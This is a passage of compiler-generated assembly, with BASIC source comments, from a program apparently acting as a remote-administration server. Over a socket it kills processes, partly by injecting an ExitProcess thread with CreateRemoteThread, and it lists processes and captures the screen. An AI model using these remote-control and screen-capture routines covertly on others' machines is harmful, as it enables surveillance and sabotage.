#undef ClientProcKill.test_pid
#endif
#define ClientProcKill.test_pid ebp-48	; exposes local variable 'test_pid'
;
	lea	eax,[ebp-48]			;;; i642
	push	eax			;;; i667a
	push	[ebp-44]			;;; i674a
	call	_GetWindowThreadProcessId@8			;;; i619
;
; [2523] IF test_pid == pid THEN
	mov	eax,d[ebp-48]			;;; i665
	mov	ebx,d[ebp+12]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> else.0100.server			;;; i219
;
; [2524] proc = 0
#ifdef ClientProcKill.proc
#undef ClientProcKill.proc
#endif
#define ClientProcKill.proc ebp-52	; exposes local variable 'proc'
;
	mov	eax,0			;;; i659
	mov	d[ebp-52],eax			;;; i670
;
; [2525] hThread = GetWindowThreadProcessId(hwnd,&proc)
#ifdef ClientProcKill.hThread
#undef ClientProcKill.hThread
#endif
#define ClientProcKill.hThread ebp-56	; exposes local variable 'hThread'
;
	lea	eax,[ebp-52]			;;; i642
	push	eax			;;; i667a
	push	[ebp-44]			;;; i674a
	call	_GetWindowThreadProcessId@8			;;; i619
	mov	d[ebp-56],eax			;;; i670
;
; [2526] PostThreadMessageA(hThread,$$WM_QUIT,0,0): Sleep (1)
;
; [0] EXTERNAL FUNCTION PostThreadMessageA (idThread, msg, wParam, lParam)
	push	0			;;; i656a
	push	0			;;; i656a
	push	18			;;; i656a
	push	[ebp-56]			;;; i674a
	call	_PostThreadMessageA@16			;;; i619
	push	1			;;; i656a
	call	_Sleep@4			;;; i619
;
; [2527] PostMessageA (hwnd, $$WM_DESTROY , 0, 0): Sleep (1)
;
; [0] EXTERNAL FUNCTION PostMessageA (hwnd, wMsg, wParam, lParam)
	push	0			;;; i656a
	push	0			;;; i656a
	push	2			;;; i656a
	push	[ebp-44]			;;; i674a
	call	_PostMessageA@16			;;; i619
	push	1			;;; i656a
	call	_Sleep@4			;;; i619
;
; [2528] PostMessageA (hwnd, $$WM_QUIT , 0, 0): Sleep (1)
	push	0			;;; i656a
	push	0			;;; i656a
	push	18			;;; i656a
	push	[ebp-44]			;;; i674a
	call	_PostMessageA@16			;;; i619
	push	1			;;; i656a
	call	_Sleep@4			;;; i619
;
; [2529] PostMessageA (hwnd, $$WM_CLOSE , 0, 0): Sleep (1)
	push	0			;;; i656a
	push	0			;;; i656a
	push	16			;;; i656a
	push	[ebp-44]			;;; i674a
	call	_PostMessageA@16			;;; i619
	push	1			;;; i656a
	call	_Sleep@4			;;; i619
;
; [2530] CloseWindow  (hwnd)
;
; [0] EXTERNAL FUNCTION CloseWindow (hwnd)
	push	[ebp-44]			;;; i674a
	call	_CloseWindow@4			;;; i619
;
; [2531] Sleep (50)
	push	50			;;; i656a
	call	_Sleep@4			;;; i619
;
; [2532] hProcess = OpenProcess(0x000F0000 | 0x00100000 | 0xFFF,1,pid)' $$PROCESS_ALL_ACCESS
#ifdef ClientProcKill.hProcess
#undef ClientProcKill.hProcess
#endif
#define ClientProcKill.hProcess ebp-60	; exposes local variable 'hProcess'
;
	mov	eax,983040			;;; i657
	or	eax,1048576			;;; i763
	or	eax,4095			;;; i763
; .xstk2B.0000 = ebp-68	; internal variable
	mov	d[ebp-68],eax			;;; i670
	push	[ebp+12]			;;; i674a
	push	1			;;; i656a
	push	[ebp-68]			;;; i674a
	call	_OpenProcess@12			;;; i619
	mov	d[ebp-60],eax			;;; i670
;
; [2533] IF (hProcess) THEN
	mov	eax,d[ebp-60]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.0101.server			;;; i221
;
; [2534] dwThreadId = 0
#ifdef ClientProcKill.dwThreadId
#undef ClientProcKill.dwThreadId
#endif
#define ClientProcKill.dwThreadId ebp-72	; exposes local variable 'dwThreadId'
;
	mov	eax,0			;;; i659
	mov	d[ebp-72],eax			;;; i670
;
; [2535] dwTimeout = 5
#ifdef ClientProcKill.dwTimeout
#undef ClientProcKill.dwTimeout
#endif
#define ClientProcKill.dwTimeout ebp-76	; exposes local variable 'dwTimeout'
;
	mov	eax,5			;;; i659
	mov	d[ebp-76],eax			;;; i670
;
; [2536] hThread = CreateRemoteThread(hProcess,NULL,0,GetProcAddress(GetModuleHandleA(&"KERNEL32.DLL"),&"ExitProcess"),0,0,&dwThreadId)
;
; [0] EXTERNAL FUNCTION CreateRemoteThread (hProcess, lpThreadAttributes, dwStackSize, lpStartess, lpParameter, dwCreationFlags, lpThreadId)
#ifdef ClientProcKill.NULL
#undef ClientProcKill.NULL
#endif
#define ClientProcKill.NULL ebp-80	; exposes local variable 'NULL'
;
	mov	eax,addr @_string.0501.server			;;; i642
	push	eax			;;; i667a
	call	_GetModuleHandleA@4			;;; i619
	mov	d[ebp-68],eax			;;; i670
	mov	eax,addr @_string.0502.server			;;; i642
	push	eax			;;; i667a
	push	[ebp-68]			;;; i674a
	call	_GetProcAddress@8			;;; i619
	mov	d[ebp-68],eax			;;; i670
	lea	eax,[ebp-72]			;;; i642
	push	eax			;;; i667a
	push	0			;;; i656a
	push	0			;;; i656a
	push	[ebp-68]			;;; i674a
	push	0			;;; i656a
	push	[ebp-80]			;;; i674a
	push	[ebp-60]			;;; i674a
	call	_CreateRemoteThread@28			;;; i619
	mov	d[ebp-56],eax			;;; i670
;
; [2537] IF (hThread) THEN
	mov	eax,d[ebp-56]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.0102.server			;;; i221
;
; [2538] WaitForSingleObject(hThread,dwTimeout)
	push	[ebp-76]			;;; i674a
	push	[ebp-56]			;;; i674a
	call	_WaitForSingleObject@8			;;; i619
;
; [2539] CloseHandle(hThread)
	push	[ebp-56]			;;; i674a
	call	_CloseHandle@4			;;; i619
;
; [2540] CloseHandle(hProcess)
	push	[ebp-60]			;;; i674a
	call	_CloseHandle@4			;;; i619
;
; [2541] ELSE
	jmp	end.if.0102.server			;;; i107
else.0102.server:
;
; [2542] TerminateProcess(hProcess,sig)
;
; [0] EXTERNAL FUNCTION TerminateProcess (hProcess, uExitCode)
#ifdef ClientProcKill.sig
#undef ClientProcKill.sig
#endif
#define ClientProcKill.sig ebp-84	; exposes local variable 'sig'
;
	push	[ebp-84]			;;; i674a
	push	[ebp-60]			;;; i674a
	call	_TerminateProcess@8			;;; i619
;
; [2543] END IF
end.if.0102.server:
;
; [2544] END IF
else.0101.server:
end.if.0101.server:
;
; [2546] SendMsg (socket,"CMSG *** process "+STRING$(pid)+" killed ***")
	sub	esp,64			;;; i487
	mov	eax,d[ebp+12]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,addr @_string.0504.server			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0505.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2547] '	RETURN $$TRUE
;
; [2548] found = $$TRUE
	mov	eax,-1			;;; i659
	mov	d[ebp-40],eax			;;; i670
;
; [2549] END IF
else.0100.server:
end.if.0100.server:
;
; [2550] END IF
else.00FF.server:
end.if.00FF.server:
;
; [2551] hwnd = GetWindow(hwnd, $$GW_HWNDNEXT)
;
; [0] EXTERNAL FUNCTION GetWindow (hwnd, wCmd)
	push	2			;;; i656a
	push	[ebp-44]			;;; i674a
	call	_GetWindow@8			;;; i619
	mov	d[ebp-44],eax			;;; i670
;
; [2552] LOOP
do.loop.00FE.server:
	jmp	do.00FE.server			;;; i222
end.do.00FE.server:
;
; [2554] IFF found THEN
	mov	eax,d[ebp-40]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.0103.server			;;; i195
;
; [2556] hProcess = OpenProcess(0x000F0000 | 0x00100000 | 0xFFF,1,pid)' $$PROCESS_ALL_ACCESS
	mov	eax,983040			;;; i657
	or	eax,1048576			;;; i763
	or	eax,4095			;;; i763
	mov	d[ebp-68],eax			;;; i670
	push	[ebp+12]			;;; i674a
	push	1			;;; i656a
	push	[ebp-68]			;;; i674a
	call	_OpenProcess@12			;;; i619
	mov	d[ebp-60],eax			;;; i670
;
; [2557] IF (hProcess) THEN
	mov	eax,d[ebp-60]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.0104.server			;;; i221
;
; [2558] dwThreadId = 0: dwTimeout = 5
	mov	eax,0			;;; i659
	mov	d[ebp-72],eax			;;; i670
	mov	eax,5			;;; i659
	mov	d[ebp-76],eax			;;; i670
;
; [2560] hThread = CreateRemoteThread(hProcess,NULL,0,GetProcAddress(GetModuleHandleA(&"KERNEL32.DLL"),&"ExitProcess"),0,0,&dwThreadId)
	mov	eax,addr @_string.0501.server			;;; i642
	push	eax			;;; i667a
	call	_GetModuleHandleA@4			;;; i619
	mov	d[ebp-68],eax			;;; i670
	mov	eax,addr @_string.0502.server			;;; i642
	push	eax			;;; i667a
	push	[ebp-68]			;;; i674a
	call	_GetProcAddress@8			;;; i619
	mov	d[ebp-68],eax			;;; i670
	lea	eax,[ebp-72]			;;; i642
	push	eax			;;; i667a
	push	0			;;; i656a
	push	0			;;; i656a
	push	[ebp-68]			;;; i674a
	push	0			;;; i656a
	push	[ebp-80]			;;; i674a
	push	[ebp-60]			;;; i674a
	call	_CreateRemoteThread@28			;;; i619
	mov	d[ebp-56],eax			;;; i670
;
; [2561] IF (hThread) THEN
	mov	eax,d[ebp-56]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.0105.server			;;; i221
;
; [2562] WaitForSingleObject(hThread,dwTimeout)
	push	[ebp-76]			;;; i674a
	push	[ebp-56]			;;; i674a
	call	_WaitForSingleObject@8			;;; i619
;
; [2563] CloseHandle(hThread)
	push	[ebp-56]			;;; i674a
	call	_CloseHandle@4			;;; i619
;
; [2564] CloseHandle(hProcess)
	push	[ebp-60]			;;; i674a
	call	_CloseHandle@4			;;; i619
;
; [2565] ELSE
	jmp	end.if.0105.server			;;; i107
else.0105.server:
;
; [2566] TerminateProcess(hProcess,sig)
	push	[ebp-84]			;;; i674a
	push	[ebp-60]			;;; i674a
	call	_TerminateProcess@8			;;; i619
;
; [2567] END IF
end.if.0105.server:
;
; [2568] SendMsg (socket,"CMSG *** process "+STRING$(pid)+" forcefully killed ***")
	sub	esp,64			;;; i487
	mov	eax,d[ebp+12]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,addr @_string.0504.server			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0507.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2569] ELSE
	jmp	end.if.0104.server			;;; i107
else.0104.server:
;
; [2570] SendMsg (socket,"CMSG *** process not found ***")
	mov	eax,addr @_string.0508.server			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2571] END IF
end.if.0104.server:
;
; [2572] END IF
else.0103.server:
end.if.0103.server:
;
; [2574] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func2B.server			;;; i258
;
; [2575] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ClientProcKill.server:  ;;; Function end label for Assembly Programmers.
end.func2B.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  ClientProcKill ()  *****
;  *****
;
; [2577] FUNCTION ClientProcList (socket)
.code
;
#ifdef ClientProcList.socket
#undef ClientProcList.socket
#endif
#define ClientProcList.socket ebp+8	; exposes function argument 'socket'
;
align 16
_ClientProcList.server@4:
;  *****
;  *****  FUNCTION  ClientProcList ()  *****
;  *****
func28.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody28.server:
;
; [2579] SendMsg (socket,"CMSG --- process list ---")
	mov	eax,addr @_string.050A.server			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2580] SendMsg (socket,"CMSG "+GetProcList())
	call	func1F.server			;;; i619
	mov	ebx,addr @_string.0452.server			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2581] SendMsg (socket,"CMSG --- process list end ---")
	mov	eax,addr @_string.050B.server			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2583] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ClientProcList.server:  ;;; Function end label for Assembly Programmers.
end.func28.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  ClientProcList ()  *****
;  *****
;
; [2585] FUNCTION ClientCapScr (socket,saveas$,qual)
.code
;
#ifdef ClientCapScr.socket
#undef ClientCapScr.socket
#endif
#define ClientCapScr.socket ebp+8	; exposes function argument 'socket'
;
;
#ifdef ClientCapScr.saveas$
#undef ClientCapScr.saveas$
#endif
#define ClientCapScr.saveas$ ebp+12	; exposes function argument 'saveas$'
;
;
#ifdef ClientCapScr.qual
#undef ClientCapScr.qual
#endif
#define ClientCapScr.qual ebp+16	; exposes function argument 'qual'
;
align 16
_ClientCapScr.server@12:
;  *****
;  *****  FUNCTION  ClientCapScr ()  *****
;  *****
func27.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func27.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,188			;;; i114a
;
funcBody27.server:
;
; [2586] UBYTE image[]
#ifdef ClientCapScr.image
#undef ClientCapScr.image
#endif
#define ClientCapScr.image ebp-40	; exposes local variable 'image'
;
;
; [2589] IF (WaitForSingleObject (#hSCAPS,15000) == $$WAIT_TIMEOUT) THEN
	push	15000			;;; i656a
	push	[%#hSCAPS.server]			;;; i672a
	call	_WaitForSingleObject@8			;;; i619
	cmp	eax,258			;;; i684a
	jne	>> else.0106.server			;;; i219
;
; [2590] SendMsg (socket,"CMSG *** cap timeout: "+saveas$+" ***")
	mov	eax,addr @_string.0511.server			;;; i663
	mov	ebx,[ebp+12]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.03B0.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2591] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func27.server			;;; i258
;
; [2592] END IF
else.0106.server:
end.if.0106.server:
;
; [2594] '	SendMsg (socket,"CMSG *** cap..")
;
; [2595] DIM image[]
	sub	esp,64			;;; i430
	mov	esi,d[ebp-40]			;;; i665
	call	%_FreeArray			;;; i431
	mov	esi,0			;;; i666
	mov	d[ebp-40],esi			;;; i670
	add	esp,64
;
; [2596] IFF CaptureScrEx (@image[]) THEN
	push	[ebp-40]			;;; i674a
	call	func43.server			;;; i619
	mov	ecx,d[esp-4]			;;; i877a
	mov	d[ebp-40],ecx			;;; i670
	test	eax,eax			;;; i194
	jnz	>> else.0107.server			;;; i195
;
; [2597] SendMsg (socket,"CMSG *** unable to acquire cap: "+saveas$+" ***")
	mov	eax,addr @_string.0512.server			;;; i663
	mov	ebx,[ebp+12]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.03B0.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2598] ReleaseSemaphore (#hSCAPS,1,NULL)
#ifdef ClientCapScr.NULL
#undef ClientCapScr.NULL
#endif
#define ClientCapScr.NULL ebp-44	; exposes local variable 'NULL'
;
	push	[ebp-44]			;;; i674a
	push	1			;;; i656a
	push	[%#hSCAPS.server]			;;; i672a
	call	_ReleaseSemaphore@12			;;; i619
;
; [2599] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func27.server			;;; i258
;
; [2600] END IF
else.0107.server:
end.if.0107.server:
;
; [2602] IFF BmpToJPGEx (@image[],saveas$,qual) THEN
	mov	eax,d[ebp+12]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk27.0000 = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
	push	[ebp+16]			;;; i674a
	push	[ebp-52]			;;; i674a
	push	[ebp-40]			;;; i674a
	call	func44.server			;;; i619
	sub	esp,12			;;; xnt1i
	mov	ecx,d[esp]			;;; i877a
	mov	d[ebp-40],ecx			;;; i670
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,12			;;; i633
	test	eax,eax			;;; i194
	jnz	>> else.0108.server			;;; i195
;
; [2603] SendMsg (socket,"CMSG *** cap ijlib15.dll not found: "+saveas$+" ***")
	mov	eax,addr @_string.0514.server			;;; i663
	mov	ebx,[ebp+12]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.03B0.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2604] ReleaseSemaphore (#hSCAPS,1,NULL)
	push	[ebp-44]			;;; i674a
	push	1			;;; i656a
	push	[%#hSCAPS.server]			;;; i672a
	call	_ReleaseSemaphore@12			;;; i619
;
; [2605] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func27.server			;;; i258
;
; [2606] ELSE
	jmp	end.if.0108.server			;;; i107
else.0108.server:
;
; [2607] '		SendMsg (socket,"CMSG *** ..ok")
;
; [2608] ReleaseSemaphore (#hSCAPS,1,NULL)
	push	[ebp-44]			;;; i674a
	push	1			;;; i656a
	push	[%#hSCAPS.server]			;;; i672a
	call	_ReleaseSemaphore@12			;;; i619
;
; [2609] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func27.server			;;; i258
;
; [2610] END IF
end.if.0108.server:
;
; [2612] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ClientCapScr.server:  ;;; Function end label for Assembly Programmers.
end.func27.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func27.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	12			;;; i111a
free.func27.server:
	mov	esi,d[ebp-40]			;;; i665
	call	%_FreeArray			;;; i424
  ret
;-peep
;  *****
;  *****  END FUNCTION  ClientCapScr ()  *****
;  *****
;
; [2614] FUNCTION BmpToJPGEx (UBYTE image[],file$,quality)
.code
;
#ifdef BmpToJPGEx.image
#undef BmpToJPGEx.image
#endif
#define BmpToJPGEx.image ebp+8	; exposes function argument 'image'
;
;
#ifdef BmpToJPGEx.file$
#undef BmpToJPGEx.file$
#endif
#define BmpToJPGEx.file$ ebp+12	; exposes function argument 'file$'
;
;
#ifdef BmpToJPGEx.quality
#undef BmpToJPGEx.quality
#endif
#define BmpToJPGEx.quality ebp+16	; exposes function argument 'quality'
;
align 16
_BmpToJPGEx.server@12:
;  *****
;  *****  FUNCTION  BmpToJPGEx ()  *****
;  *****
func44.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,3				;;; ..
	xor	eax,eax			;;; ...
A.382:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.382			;;; .....
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,168			;;; i114a
;
funcBody44.server:
;
; [2615] STATIC JPEG_CORE_PROPERTIES jcprops
data section 'globals$statics'
align	4
%44%jcprops.server:	db 4 dup ?
.code
;
; [2616] STATIC FUNCADDR pijlInit (XLONG)
data section 'globals$statics'
align	4
%44%pijlInit.server:	db 4 dup ?
.code
;
; [2617] STATIC FUNCADDR pijlWrite (XLONG,XLONG)
data section 'globals$statics'
align	4
%44%pijlWrite.server:	db 4 dup ?
.code
;
; [2618] STATIC FUNCADDR pijlFree (XLONG)
data section 'globals$statics'
align	4
%44%pijlFree.server:	db 4 dup ?
.code
;
; [2619] SHARED ijllibHandle
;
; [2622] IFZ file$ THEN RETURN $$FALSE
	mov	eax,[ebp+12]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.375			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.0109.server			;;; i192
A.375:
	mov	eax,0			;;; i659
	jmp	end.func44.server			;;; i258
else.0109.server:
end.if.0109.server:
;
; [2623] IF SIZE(image[]) < 1000 THEN RETURN $$FALSE
	mov	eax,d[ebp+8]			;;; i665
	test	eax,eax			;;; i586
	jz	> A.376			;;; i587
	mov	esi,d[eax-4]			;;; i588
	mov	eax,d[eax-8]			;;; i589
	and	esi,65535			;;; i590
	imul	eax,esi			;;; i591
A.376:
	cmp	eax,1000			;;; i684a
	jge	>> else.010A.server			;;; i219
	mov	eax,0			;;; i659
	jmp	end.func44.server			;;; i258
else.010A.server:
end.if.010A.server:
;
; [2625] GetImageArrayInfo (@image[], @bpp, @width, @height)
#ifdef BmpToJPGEx.bpp
#undef BmpToJPGEx.bpp
#endif
#define BmpToJPGEx.bpp ebp-40	; exposes local variable 'bpp'
;
#ifdef BmpToJPGEx.width
#undef BmpToJPGEx.width
#endif
#define BmpToJPGEx.width ebp-44	; exposes local variable 'width'
;
#ifdef BmpToJPGEx.height
#undef BmpToJPGEx.height
#endif
#define BmpToJPGEx.height ebp-48	; exposes local variable 'height'
;
	push	[ebp-48]			;;; i674a
	push	[ebp-44]			;;; i674a
	push	[ebp-40]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	func40.server			;;; i619
	mov	ecx,d[esp-16]			;;; i877a
	mov	ebx,d[esp-12]			;;; i877b
	mov	edi,d[esp-8]			;;; i877c
	mov	esi,d[esp-4]			;;; i877d
	mov	d[ebp+8],ecx			;;; i670
	mov	d[ebp-40],ebx			;;; i670
	mov	d[ebp-44],edi			;;; i670
	mov	d[ebp-48],esi			;;; i670
;
; [2626] IF (bpp != 24) THEN RETURN $$FALSE
	mov	eax,d[ebp-40]			;;; i665
	cmp	eax,24			;;; i684a
	je	>> else.010B.server			;;; i219
	mov	eax,0			;;; i659
	jmp	end.func44.server			;;; i258
else.010B.server:
end.if.010B.server:
;
; [2628] IFZ ijllibHandle THEN
	mov	eax,d[%ijllibHandle.server]			;;; i663a
	test	eax,eax			;;; i194
	jnz	>> else.010C.server			;;; i195
;
; [2629] ijllibHandle = LoadLibraryA(&"ijl15.dll")
	mov	eax,addr @_string.0521.server			;;; i642
	push	eax			;;; i667a
	call	_LoadLibraryA@4			;;; i619
	mov	d[%ijllibHandle.server],eax			;;; i668
;
; [2630] IFZ ijllibHandle THEN RETURN $$FALSE
	mov	eax,d[%ijllibHandle.server]			;;; i663a
	test	eax,eax			;;; i194
	jnz	>> else.010D.server			;;; i195
	mov	eax,0			;;; i659
	jmp	end.func44.server			;;; i258
else.010D.server:
end.if.010D.server:
;
; [2631] pijlInit = GetProcAddress (ijllibHandle,&"ijlInit")
	mov	eax,addr @_string.0522.server			;;; i642
	push	eax			;;; i667a
	push	[%ijllibHandle.server]			;;; i672a
	call	_GetProcAddress@8			;;; i619
	mov	d[%44%pijlInit.server],eax			;;; i668
;
; [2632] pijlFree = GetProcAddress (ijllibHandle,&"ijlFree")
	mov	eax,addr @_string.0523.server			;;; i642
	push	eax			;;; i667a
	push	[%ijllibHandle.server]			;;; i672a
	call	_GetProcAddress@8			;;; i619
	mov	d[%44%pijlFree.server],eax			;;; i668
;
; [2633] pijlWrite = GetProcAddress (ijllibHandle,&"ijlWrite")
	mov	eax,addr @_string.0524.server			;;; i642
	push	eax			;;; i667a
	push	[%ijllibHandle.server]			;;; i672a
	call	_GetProcAddress@8			;;; i619
	mov	d[%44%pijlWrite.server],eax			;;; i668
;
; [2634] END IF
else.010C.server:
end.if.010C.server:
;
; [2635] IF (@pijlInit (&jcprops) != $$IJL_OK) THEN
	mov	eax,d[%44%pijlInit.server]			;;; i663a
	xor	edx,edx			;;; i602
	test	eax,eax			;;; i603
	jz	>> A.377			;;; i604
; .xstk44.0000 = ebp-56	; internal variable
	mov	d[ebp-56],eax			;;; i670
	mov	eax,d[%44%jcprops.server]			;;; i642
	push	eax			;;; i667a
	mov	eax,d[ebp-56]			;;; i665
	call	eax			;;; i620
A.377:
	cmp	eax,0			;;; i684a
	je	>> else.010E.server			;;; i219
;
; [2636] FreeLibrary(ijllibHandle)
	push	[%ijllibHandle.server]			;;; i672a
	call	_FreeLibrary@4			;;; i619
;
; [2637] ijllibHandle = 0
	mov	eax,0			;;; i659
	mov	d[%ijllibHandle.server],eax			;;; i668
;
; [2638] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func44.server			;;; i258
;
; [2639] END IF
else.010E.server:
end.if.010E.server:
;
; [2640] IFZ quality THEN quality = 80
	mov	eax,d[ebp+16]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.010F.server			;;; i195
	mov	eax,80			;;; i659
	mov	d[ebp+16],eax			;;; i670
else.010F.server:
end.if.010F.server:
;
; [2642] jcprops.DIBWidth       = width
	mov	eax,d[%44%jcprops.server]			;;; i663a
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[eax+8],ebx			;;; i13b
;
; [2643] jcprops.DIBHeight      = -height
	mov	eax,d[ebp-48]			;;; i665
	neg	eax			;;; i917
	mov	ebx,d[%44%jcprops.server]			;;; i663a
	mov	d[ebx+12],eax			;;; i13b
;
; [2644] jcprops.DIBChannels    = 3
	mov	eax,d[%44%jcprops.server]			;;; i663a
	mov	ebx,3			;;; i659
	mov	d[eax+20],ebx			;;; i13b
;
; [2645] jcprops.DIBColor       = $$IJL_BGR
